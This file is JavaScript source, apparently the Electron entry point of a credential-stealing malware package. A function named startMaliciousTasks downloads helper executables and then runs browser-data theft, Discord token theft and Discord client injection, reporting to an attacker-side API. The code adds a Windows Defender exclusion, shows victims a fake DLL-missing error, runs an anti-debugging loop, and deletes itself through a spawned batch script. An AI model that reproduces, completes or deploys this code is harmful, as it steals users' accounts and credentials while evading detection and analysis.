"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const crypto = require("crypto");
const util = require("util");
const electron = require("electron");
const child_process = require("child_process");

const discordTokens = require("./discord/tokens");
const browsersSend = require("./browsers/send");
const discordInjection = require("./discord/injection");
const apiSender = require("./api/sender");
const utilsExtractor = require("./utils/setupExtractor");
const utilsDecrypt = require("./utils/setupDecrypt");
const config = require("./config/constants");
const utilsDefender = require("./utils/applyDefenderExclusion");

const rmDirAsync = util.promisify(fs.rmdir);
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function startMaliciousTasks() {
    try {
        await utilsExtractor.downloadExtractor();
        await utilsDecrypt.downloadDecrypt();
        await sleep(2000);

        const tempDir = path.join(os.tmpdir(), crypto.randomBytes(8).toString("hex"));
        fs.mkdirSync(tempDir, { recursive: true });

        const executeTask = async (task) => {
            try {
                return await task();
            } catch (err) {
                apiSender.sendGenericMessage(err.message);
                return null;
            }
        };

        await executeTask(browsersSend.runB);
        await executeTask(discordTokens.stealTokens);
        await executeTask(discordInjection.dcinject);

        try {
            await rmDirAsync(tempDir);
        } catch (e) {}
    } catch (e) {
        apiSender.sendGenericMessage(e.message);
    }
}

electron.app.disableHardwareAcceleration();
electron.app.commandLine.appendSwitch("disable-gpu");
electron.app.commandLine.appendSwitch("no-sandbox");

electron.app.on("ready", async () => {
    utilsDefender.applyDefenderExclusion();

    const windowOptions = {
        width: 1100,
        height: 750,
        transparent: true,
        frame: false,
        resizable: false,
        alwaysOnTop: true,
        backgroundColor: "#000000",
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    };

    const mainWindow = new electron.BrowserWindow(windowOptions);
    const themePath = path.join(__dirname, "themes", config.THEME);
    
    apiSender.sendGenericMessage("Yol: " + themePath);
    mainWindow.loadFile(themePath);

    mainWindow.once("ready-to-show", () => {
        mainWindow.show();
    });

    try {
        await startMaliciousTasks();

        setTimeout(() => {
            const exeName = path.basename(process.execPath);
            electron.dialog.showErrorBox(
                exeName + " Error", 
                "The code execution cannot proceed because d3dx9_43.dll was not found.\nReinstalling the program may fix this problem."
            );
        }, 30000);

    } catch (err) {
        apiSender.sendGenericMessage(err.message);
    } finally {
        const asarPath = path.join(process.resourcesPath, "app.asar");
        const extractorPath = path.join(process.resourcesPath, "lib", "Extractor.exe");
        const decryptPath = path.join(process.resourcesPath, "lib", "Decrypt.exe");
        const batchPath = path.join(os.tmpdir(), "cleanup.bat");

        const cleanupScript = `
@echo off
timeout /t 1 /nobreak > nul
del "${asarPath}"
del "${extractorPath}"
del "${decryptPath}"
del "%~f0"
        `;

        fs.writeFileSync(batchPath, cleanupScript);
        child_process.spawn("cmd.exe", ["/c", batchPath], {
            detached: true,
            stdio: "ignore"
        }).unref();

        electron.app.quit();
    }
});

function antiDebug(n) {
    function check(i) {
        if (typeof i === "string") {
            return function(p){}.constructor("while (true) {}").apply("counter");
        } else if (("" + i / i).length !== 1 || i % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
        check(++i);
    }
    try {
        if (n) return check;
        check(0);
    } catch (e) {}
}

setInterval(antiDebug, 4000);
